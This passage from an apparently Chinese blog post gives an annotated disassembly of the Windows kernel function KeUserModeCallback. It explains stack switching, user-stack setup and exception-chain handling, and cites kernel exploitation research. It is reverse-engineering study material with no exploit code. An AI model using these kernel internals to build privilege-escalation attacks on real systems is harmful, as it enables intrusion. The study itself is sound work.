class="number">007</span>EDA80 <span class="comment">// =============== S U B R O U T I N E =======================================</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">// KeUserModeCallback (</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">//     IN ULONG ApiNumber,</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">//     IN PVOID InputBuffer,</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">//     IN ULONG InputLength,</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">//     OUT PVOID *OutputBuffer,</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">//     IN PULONG OutputLength</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">//     )</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">// Attributes: bp-based frame</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">// int __stdcall KeUserModeCallback(int, void *, size_t, int, int)</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80                 <span class="keyword">public</span> _KeUserModeCallback@<span class="number">20</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80 _KeUserModeCallback@<span class="number">20</span> proc near</span><br><span class="line">PAGE:<span class="number">007</span>EDA80</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 var_3C          = dword ptr <span class="number">-3</span>Ch</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 var_TrapFrame2  = dword ptr <span class="number">-38</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 var_HardwareEsp2= dword ptr <span class="number">-34</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 var_TEBGdiBatchCount= dword ptr <span class="number">-30</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 var_2C_0_R3ExceptionList= dword ptr <span class="number">-2</span>Ch</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 var_CurrentThread= dword ptr <span class="number">-28</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 var_NewStackBaseAddress= dword ptr <span class="number">-24</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 var_HardwareEsp = dword ptr <span class="number">-20</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 var_TrapFrame   = dword ptr <span class="number">-1</span>Ch</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 ms_exc          = CPPEH_RECORD ptr <span class="number">-18</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 arg_ApiNumber   = dword ptr  <span class="number">8</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80 arg_InputBuffer_returnStatus= dword ptr  <span class="number">0</span>Ch</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 arg_InputLength_R3ExceptionList= dword ptr  <span class="number">10</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 arg_OutputBuffer= dword ptr  <span class="number">14</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 arg_OutputLength= dword ptr  <span class="number">18</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDA80</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">// FUNCTION CHUNK AT PAGE:008F6C8E SIZE 000000B8 BYTES</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80</span><br><span class="line">PAGE:<span class="number">007</span>EDA80 <span class="comment">// __unwind &#123; // __except_handler4</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA80                 mov     edi, edi</span><br><span class="line">PAGE:<span class="number">007</span>EDA82                 push    ebp</span><br><span class="line">PAGE:<span class="number">007</span>EDA83                 mov     ebp, esp</span><br><span class="line">PAGE:<span class="number">007</span>EDA85                 push    <span class="number">0F</span>FFFFFFEh</span><br><span class="line">PAGE:<span class="number">007</span>EDA87                 push    offset stru_69FD80</span><br><span class="line">PAGE:<span class="number">007</span>EDA8C                 push    offset __except_handler4 <span class="comment">// 安装SEH</span></span><br><span class="line">PAGE:<span class="number">007</span>EDA91                 mov     eax, large fs:_KPCR</span><br><span class="line">PAGE:<span class="number">007</span>EDA97                 push    eax</span><br><span class="line">PAGE:<span class="number">007</span>EDA98                 sub     esp, <span class="number">2</span>Ch</span><br><span class="line">PAGE:<span class="number">007</span>EDA9B                 push    ebx</span><br><span class="line">PAGE:<span class="number">007</span>EDA9C                 push    esi</span><br><span class="line">PAGE:<span class="number">007</span>EDA9D                 push    edi</span><br><span class="line">PAGE:<span class="number">007</span>EDA9E                 mov     eax, ___security_cookie</span><br><span class="line">PAGE:<span class="number">007</span>EDAA3                 <span class="keyword">xor</span>     [ebp+ms_exc.registration.ScopeTable], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDAA6                 <span class="keyword">xor</span>     eax, ebp</span><br><span class="line">PAGE:<span class="number">007</span>EDAA8                 push    eax</span><br><span class="line">PAGE:<span class="number">007</span>EDAA9                 lea     eax, [ebp+ms_exc.registration]</span><br><span class="line">PAGE:<span class="number">007</span>EDAAC                 mov     large fs:<span class="number">0</span>, eax</span><br><span class="line">PAGE:<span class="number">007</span>EDAB2                 mov     [ebp+ms_exc.old_esp], esp</span><br><span class="line">PAGE:<span class="number">007</span>EDAB5                 mov     [ebp+var_2C_0_R3ExceptionList], <span class="number">0</span></span><br><span class="line">PAGE:<span class="number">007</span>EDABC                 mov     esi, large fs:_KPCR.PrcbData.CurrentThread</span><br><span class="line">PAGE:<span class="number">007</span>EDAC3                 mov     [ebp+var_CurrentThread], esi</span><br><span class="line">PAGE:<span class="number">007</span>EDAC6                 test    [esi+_KTHREAD.___u18.MiscFlags], <span class="number">1000</span>h <span class="comment">// CurrentThread.CalloutActive == 1?</span></span><br><span class="line">PAGE:<span class="number">007</span>EDACD                 jnz     loc_8F6C8E      <span class="comment">// MiscFlags.CalloutActive == 1，KeBugCheckEx蓝屏</span></span><br><span class="line">PAGE:<span class="number">007</span>EDAD3                 mov     edi, ds:__imp__KeGetCurrentIrql@<span class="number">0</span> <span class="comment">// KeGetCurrentIrql()</span></span><br><span class="line">PAGE:<span class="number">007</span>EDAD9                 call    edi <span class="comment">// KeGetCurrentIrql()</span></span><br><span class="line">PAGE:<span class="number">007</span>EDADB                 test    al, al</span><br><span class="line">PAGE:<span class="number">007</span>EDADD                 jnz     loc_8F6C9F      <span class="comment">// IRQL != PASSIVE_LEVCEL, KeBugCheckEx蓝屏</span></span><br><span class="line">PAGE:<span class="number">007</span>EDAE3                 mov     cl, [esi+_KTHREAD.___u49.__s1.ApcStateIndex]</span><br><span class="line">PAGE:<span class="number">007</span>EDAE9                 test    cl, cl          <span class="comment">// ApcStateIndex:</span></span><br><span class="line">PAGE:<span class="number">007</span>EDAE9                                         <span class="comment">// 0 正常状态</span></span><br><span class="line">PAGE:<span class="number">007</span>EDAE9                                         <span class="comment">// 1 挂靠状态</span></span><br><span class="line">PAGE:<span class="number">007</span>EDAEB                 jnz     loc_8F6D2E      <span class="comment">// 当前线程处于挂靠状态、内核APC已禁用，KeBugCheckEx</span></span><br><span class="line">PAGE:<span class="number">007</span>EDAF1                 cmp     dword ptr [esi+_KTHREAD.___u42.__s4.KernelApcDisable], <span class="number">0</span></span><br><span class="line">PAGE:<span class="number">007</span>EDAF8                 jnz     loc_8F6D2E      <span class="comment">// 当前线程处于挂靠状态、内核APC已禁用，KeBugCheckEx</span></span><br><span class="line">PAGE:<span class="number">007</span>EDAFE                 mov     cl, [esi+_KTHREAD.___u55.__s6.CallbackNestingLevel]</span><br><span class="line">PAGE:<span class="number">007</span>EDB04                 mov     al, cl</span><br><span class="line">PAGE:<span class="number">007</span>EDB06                 inc     al              <span class="comment">// KeUserModeCallback每调用一次，回调嵌套深度 +1</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB08                 mov     [esi+_KTHREAD.___u55.__s6.CallbackNestingLevel], al</span><br><span class="line">PAGE:<span class="number">007</span>EDB0E                 cmp     al, <span class="number">1F</span>h         <span class="comment">// 回调嵌套最大深度为 0x1F = 31</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB10                 ja      loc_8F6CB4      <span class="comment">// return STATUS_STACK_OVERFLOW(0xC00000FD)</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB16                 mov     eax, [esi+_KTHREAD.___u49.__s1.IdealProcessor]</span><br><span class="line">PAGE:<span class="number">007</span>EDB1C                 mov     eax, ds:_KiProcessorBlock[eax*<span class="number">4</span>] <span class="comment">// KiProcessorBlock 显示其对应的KPCRB结构体的地址</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB23                 mov     eax, [eax+_KPRCB.ParentNode] <span class="comment">// _KNODE结构，跟 NUMA 内存管理方式有关</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB23                                         <span class="comment">// https://saturn35.com/2019/07/22/翻译-Kernel-Pool-Exploitation-on-Windows-7-By-Tarjei-Mandt/</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB29                 push    esi</span><br><span class="line">PAGE:<span class="number">007</span>EDB2A                 movzx   edx, [eax+_KNODE.___u13.__s1.NodeNumber]</span><br><span class="line">PAGE:<span class="number">007</span>EDB31                 <span class="keyword">xor</span>     ecx, ecx</span><br><span class="line">PAGE:<span class="number">007</span>EDB33                 call    _MmCreateKernelStack@<span class="number">12</span> <span class="comment">// ===================================================</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB33                                         <span class="comment">// 创建64KB大小的内存空间，用于线程在内核空间的堆栈大小</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB33                                         <span class="comment">// 返回值是栈底，高地址（跟常规分配一块内存返回内存低地址不同）</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB33                                         <span class="comment">// 推断是快速调用，参数三是IdealProcessor</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB33                                         <span class="comment">// PVOID NTAPI MmCreateKernelStack(IN BOOLEAN GuiStack,</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB33                                         <span class="comment">//                     IN UCHAR Node, IN ULON IdealProcessor)//</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB33                                         <span class="comment">// ===================================================</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB38                 mov     [ebp+var_NewStackBaseAddress], eax <span class="comment">// 在内核空间创建一个内核栈，返回值是栈底StackBase，高地址（跟常规分配一块内存返回内存低地址不同）</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB38                                         <span class="comment">// 从 Vista 开始，每次回调到用户空间都会给线程新建一个线程栈——《BH_US_11_Mandt_win32k_ Slides》</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB38                                         <span class="comment">// 将原先线程栈保存后，然后将线程栈信息拷贝过来。</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3B                 test    eax, eax</span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                 jz      loc_8F6CC4      <span class="comment">// 由于暂时不知道线程栈结构，先用以下方式标记栈的变化</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">// ====================================</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">// 栈底：StackBase</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">// 栈顶：KSTACK_CONTROL.ActualLimit</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">// 栈大小：KeKernelStackSize</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">//</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">// ActualLimit = StackBase - KeKernelStackSize//</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">// pKeepStackBase = StackBase - 0x20//</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">// pKeepStackTop = pKeepStackBase + 4//</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">//</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">// *(DWORD*)pKeepStackBase = StackBase//</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">// *(DWORD*)pKeepStackTop = ActualLimit//</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">//</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB3D                                         <span class="comment">// ====================================</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB43                 lea     ecx, [eax<span class="number">-20</span>h]</span><br><span class="line">PAGE:<span class="number">007</span>EDB46                 mov     [ecx+_KSTACK_CONTROL.StackBase], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDB48                 sub     eax, ds:_KeKernelStackSize <span class="comment">// 栈的大小为 KeKernelStackSize</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB48                                         <span class="comment">// 此时 eax 指向栈顶</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB4E                 mov     [ecx+_KSTACK_CONTROL.___u1.ActualLimit], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDB51                 mov     eax, [esi+_KTHREAD.StackBase] <span class="comment">// 栈的基址，函数调用时会变化，ebp</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB51                                         <span class="comment">// KernelStack，栈顶，esp</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB54                 mov     [ecx+_KSTACK_CONTROL.PreviousThreadStackInfo.StackBase], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDB57                 mov     eax, [esi+_KTHREAD.StackLimit] <span class="comment">// 栈的大小</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB5A                 mov     [ecx+_KSTACK_CONTROL.PreviousThreadStackInfo.StackLimit], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDB5D                 mov     eax, [esi+_KTHREAD.InitialStack] <span class="comment">// 原始栈底，该值为栈分配出来时的栈底</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB60                 mov     [ecx+_KSTACK_CONTROL.PreviousThreadStackInfo.InitialStack], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDB63                 mov     eax, [esi+_KTHREAD.TrapFrame]</span><br><span class="line">PAGE:<span class="number">007</span>EDB66                 mov     [ebp+var_TrapFrame], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDB69                 mov     [ebp+var_TrapFrame2], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDB6C                 mov     ecx, [eax+_KTRAP_FRAME.HardwareEsp] <span class="comment">// esp3</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB6F                 mov     [ebp+var_HardwareEsp], ecx</span><br><span class="line">PAGE:<span class="number">007</span>EDB72                 mov     [ebp+var_HardwareEsp2], ecx</span><br><span class="line">PAGE:<span class="number">007</span>EDB75                 mov     eax, [ebp+arg_InputLength_R3ExceptionList]</span><br><span class="line">PAGE:<span class="number">007</span>EDB78                 add     eax, <span class="number">3</span>          <span class="comment">// 将输入缓冲区的长度进行 4 字节对齐</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB7B                 <span class="keyword">and</span>     eax, <span class="number">0F</span>FFFFFFCh</span><br><span class="line">PAGE:<span class="number">007</span>EDB7E                 add     eax, <span class="number">1</span>Ch        <span class="comment">// 缓冲区长度 += 0x1C//</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB81                 mov     ebx, ecx        <span class="comment">// ebx = ecx = HardwareEsp(esp3)</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB83                 sub     ebx, eax        <span class="comment">// ============================================================</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB83                                         <span class="comment">// 这里是抬升 HardwareEsp（esp3），即抬升 3 环堆栈</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB83                                         <span class="comment">// 猜测是即将要将参数 InputBuffer 的数据拷贝至 3 环堆栈中</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB83                                         <span class="comment">// 拷贝的总数据长度是 InputLength + 0x1C，这里的 0x1C 应该是一些存放</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB83                                         <span class="comment">// 用来描述 InputBuffer 的结构/数据</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB83                                         <span class="comment">// ============================================================</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB85                 <span class="keyword">and</span>     ebx, <span class="number">0F</span>FFFFFFCh <span class="comment">// 同样的先将堆栈的大小进行 4 字节大小对齐</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB88 <span class="comment">//   __try &#123; // __except at loc_8F6D16</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB88                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0</span> <span class="comment">// 进入 _try</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB8F                 push    <span class="number">4</span>               <span class="comment">// Alignment</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB91                 push    eax             <span class="comment">// Length</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB92                 push    ebx             <span class="comment">// Address</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB93                 call    _ProbeForWrite@<span class="number">12</span> <span class="comment">// ProbeForWrite(x,x,x)</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB98                 lea     edi, [ebx+<span class="number">1</span>Ch]  <span class="comment">// edi 指向 HardwareEsp 的位置</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB9B                 push    [ebp+arg_InputLength_R3ExceptionList] <span class="comment">// size_t</span></span><br><span class="line">PAGE:<span class="number">007</span>EDB9E                 push    [ebp+arg_InputBuffer_returnStatus] <span class="comment">// void *</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBA1                 push    edi             <span class="comment">// void *</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBA2                 call    _memcpy         <span class="comment">// 这里将 0 环 InputBuffer 的数据拷贝至 3 环的堆栈</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBA7                 add     esp, <span class="number">0</span>Ch        <span class="comment">// 为什么要将 esp 提升？？？？？？？？？？？？</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBAA                 mov     [ebx+<span class="number">8</span>], edi    <span class="comment">// 从这里开始填充 3 环堆栈中对那 0x1C 的位置进行填充</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBAD                 mov     eax, [ebp+arg_InputLength_R3ExceptionList]</span><br><span class="line">PAGE:<span class="number">007</span>EDBB0                 mov     [ebx+<span class="number">0</span>Ch], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDBB3                 mov     eax, [ebp+arg_ApiNumber]</span><br><span class="line">PAGE:<span class="number">007</span>EDBB6                 mov     [ebx+<span class="number">4</span>], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDBB9                 mov     eax, [ebp+var_HardwareEsp]</span><br><span class="line">PAGE:<span class="number">007</span>EDBBC                 mov     [ebx+<span class="number">18</span>h], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDBBF                 mov     ecx, [ebp+var_TrapFrame]</span><br><span class="line">PAGE:<span class="number">007</span>EDBC2                 mov     eax, [ecx+_KTRAP_FRAME._Eip] <span class="comment">// 原先的 Old_Eip3</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBC5                 mov     [ebx], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDBC7                 mov     eax, [esi+_KTHREAD.Teb] <span class="comment">// 不更新 3 环的TEB（异常链条）！！！！！！！！！！！！！！</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBCD                 mov     eax, [eax]      <span class="comment">// 取3环异常链条的地址，赋值给eax</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBCF                 mov     [ebp+arg_InputLength_R3ExceptionList], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDBD2                 mov     [ebp+var_2C_0_R3ExceptionList], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDBD2 <span class="comment">//   &#125; // starts at 7EDB88</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBD5                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0F</span>FFFFFFEh <span class="comment">// 从 _try 里出来到最外层</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBDC                 mov     [ecx+_KTRAP_FRAME.HardwareEsp], ebx <span class="comment">// ====================</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBDC                                         <span class="comment">// 更新 esp3</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBDC                                         <span class="comment">// 这里的 ebx 为新的 esp3，回调到 3 环时使用！！！！！！！！！！！</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBDC                                         <span class="comment">// ====================！！！！！！！！！！！</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBDF                 mov     ebx, [ebp+var_NewStackBaseAddress]</span><br><span class="line">PAGE:<span class="number">007</span>EDBE2                 push    ebx</span><br><span class="line">PAGE:<span class="number">007</span>EDBE3                 lea     eax, [ebx<span class="number">-20</span>h]  <span class="comment">// 减0x20是因为：这0x20字节里面存了原始系线程堆栈相关的内容</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBE3                                         <span class="comment">// 如CurrentThread.StackBase等</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBE6                 push    eax</span><br><span class="line">PAGE:<span class="number">007</span>EDBE7                 push    [ebp+arg_OutputLength]</span><br><span class="line">PAGE:<span class="number">007</span>EDBEA                 push    [ebp+arg_OutputBuffer]</span><br><span class="line">PAGE:<span class="number">007</span>EDBED                 call    _KiCallUserMode@<span class="number">16</span> <span class="comment">// KiCallUserMod (</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBED                                         <span class="comment">//                     IN PVOID   *OutputBuffer,</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBED                                         <span class="comment">//                     IN PULONG  OutputLength,</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBED                                         <span class="comment">//                     IN PVOID   pPreviousThreadStack,</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBED                                         <span class="comment">//                     IN PVOID   pNewStackBaseAddress</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBED                                         <span class="comment">// )</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBF2                 mov     edi, eax        <span class="comment">// NTSTATUS</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBF4                 mov     [ebp+arg_InputBuffer_returnStatus], edi</span><br><span class="line">PAGE:<span class="number">007</span>EDBF7 <span class="comment">//   __try &#123; // __except at loc_8F6CDA</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBF7                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">1</span></span><br><span class="line">PAGE:<span class="number">007</span>EDBFE                 cmp     edi, <span class="number">0</span>C0000423h <span class="comment">// STATUS_CALLBACK_POP_STACK(A user mode unwind is in progress.)</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC04                 jz      <span class="keyword">short</span> loc_7EDC11</span><br><span class="line">PAGE:<span class="number">007</span>EDC06                 mov     eax, [esi+_KTHREAD.Teb]</span><br><span class="line">PAGE:<span class="number">007</span>EDC0C                 mov     ecx, [ebp+arg_InputLength_R3ExceptionList]</span><br><span class="line">PAGE:<span class="number">007</span>EDC0F                 mov     [eax+_TEB.NtTib.ExceptionList], ecx <span class="comment">// 恢复原先的3环异常链条</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC11</span><br><span class="line">PAGE:<span class="number">007</span>EDC11 loc_7EDC11:                             <span class="comment">// CODE XREF: KeUserModeCallback(x,x,x,x,x)+184↑j</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC11                 mov     eax, [esi+_KTHREAD.Teb]</span><br><span class="line">PAGE:<span class="number">007</span>EDC17                 mov     eax, [eax+_TEB.GdiBatchCount]</span><br><span class="line">PAGE:<span class="number">007</span>EDC1D                 mov     [ebp+var_TEBGdiBatchCount], eax</span><br><span class="line">PAGE:<span class="number">007</span>EDC1D <span class="comment">//   &#125; // starts at 7EDBF7</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC20                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0F</span>FFFFFFEh</span><br><span class="line">PAGE:<span class="number">007</span>EDC27                 mov     ecx, [ebp+var_TrapFrame]</span><br><span class="line">PAGE:<span class="number">007</span>EDC2A</span><br><span class="line">PAGE:<span class="number">007</span>EDC2A loc_7EDC2A:                             <span class="comment">// CODE XREF: KeUserModeCallback(x,x,x,x,x)+109281↓j</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC2A                 test    eax, eax</span><br><span class="line">PAGE:<span class="number">007</span>EDC2C                 jnz     <span class="keyword">short</span> loc_7EDC64 <span class="comment">// TEB.GdiBatchCount != 0</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC2E</span><br><span class="line">PAGE:<span class="number">007</span>EDC2E loc_7EDC2E:                             <span class="comment">// CODE XREF: KeUserModeCallback(x,x,x,x,x)+1F8↓j</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC2E                 cmp     edi, <span class="number">0</span>C0000423h <span class="comment">// STATUS_CALLBACK_POP_STACK(A user mode unwind is in progress.)</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC34                 jz      <span class="keyword">short</span> loc_7EDC3F</span><br><span class="line">PAGE:<span class="number">007</span>EDC36                 mov     eax, [ebp+var_TrapFrame]</span><br><span class="line">PAGE:<span class="number">007</span>EDC39                 mov     ecx, [ebp+var_HardwareEsp]</span><br><span class="line">PAGE:<span class="number">007</span>EDC3C                 mov     [eax+_KTRAP_FRAME.HardwareEsp], ecx</span><br><span class="line">PAGE:<span class="number">007</span>EDC3F</span><br><span class="line">PAGE:<span class="number">007</span>EDC3F loc_7EDC3F:                             <span class="comment">// CODE XREF: KeUserModeCallback(x,x,x,x,x)+1B4↑j</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC3F                                         <span class="comment">// KeUserModeCallback(x,x,x,x,x)+1092A9↓j</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC3F                 dec     [esi+_KTHREAD.___u55.__s6.CallbackNestingLevel]</span><br><span class="line">PAGE:<span class="number">007</span>EDC45                 <span class="keyword">xor</span>     edx, edx</span><br><span class="line">PAGE:<span class="number">007</span>EDC47                 mov     ecx, ebx</span><br><span class="line">PAGE:<span class="number">007</span>EDC49                 call    _MmDeleteKernelStack@<span class="number">8</span> <span class="comment">// MmDeleteKernelStack(x,x)</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC4E                 mov     eax, edi</span><br><span class="line">PAGE:<span class="number">007</span>EDC50</span><br><span class="line">PAGE:<span class="number">007</span>EDC50 loc_7EDC50:                             <span class="comment">// CODE XREF: KeUserModeCallback(x,x,x,x,x)+10923F↓j</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC50                                         <span class="comment">// KeUserModeCallback(x,x,x,x,x)+10924F↓j</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC50                 mov     ecx, [ebp+ms_exc.registration.Next]</span><br><span class="line">PAGE:<span class="number">007</span>EDC53                 mov     large fs:<span class="number">0</span>, ecx</span><br><span class="line">PAGE:<span class="number">007</span>EDC5A                 pop     ecx</span><br><span class="line">PAGE:<span class="number">007</span>EDC5B                 pop     edi</span><br><span class="line">PAGE:<span class="number">007</span>EDC5C                 pop     esi</span><br><span class="line">PAGE:<span class="number">007</span>EDC5D                 pop     ebx</span><br><span class="line">PAGE:<span class="number">007</span>EDC5E                 mov     esp, ebp</span><br><span class="line">PAGE:<span class="number">007</span>EDC60                 pop     ebp</span><br><span class="line">PAGE:<span class="number">007</span>EDC61                 retn    <span class="number">14</span>h</span><br><span class="line">PAGE:<span class="number">007</span>EDC64 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC64</span><br><span class="line">PAGE:<span class="number">007</span>EDC64 loc_7EDC64:                             <span class="comment">// CODE XREF: KeUserModeCallback(x,x,x,x,x)+1AC↑j</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC64                 add     dword ptr [ecx+<span class="number">74</span>h], <span class="number">0F</span>FFFFF00h <span class="comment">// TEB.GdiBatchCount != 0</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC6B                 push    <span class="number">0</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC6D                 push    <span class="number">0</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC6F                 push    <span class="number">0</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC71                 push    <span class="number">7</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC73                 call    _PsInvokeWin32Callout@<span class="number">16</span> <span class="comment">// PsInvokeWin32Callout(x,x,x,x)</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC78                 jmp     <span class="keyword">short</span> loc_7EDC2E <span class="comment">// STATUS_CALLBACK_POP_STACK(A user mode unwind is in progress.)</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC78 <span class="comment">// &#125; // starts at 7EDA80</span></span><br><span class="line">PAGE:<span class="number">007</span>EDC78 _KeUserModeCallback@<span class="number">20</span> endp</span><br></pre></td></tr></table></figure>





<p><img data-src="https://s2.loli.net/2022/10/17/CzKN4hkqQXYuDtM.png" alt="33.png"></p>
<h3 id="4-3-KiCallUserMode函数分析"><a href="#4-3-KiCallUserMode函数分析" class="headerlink" title="4.3 KiCallUserMode函数分析"></a>4.3 KiCallUserMode函数分析</h3><p>函数原型如下：</p>
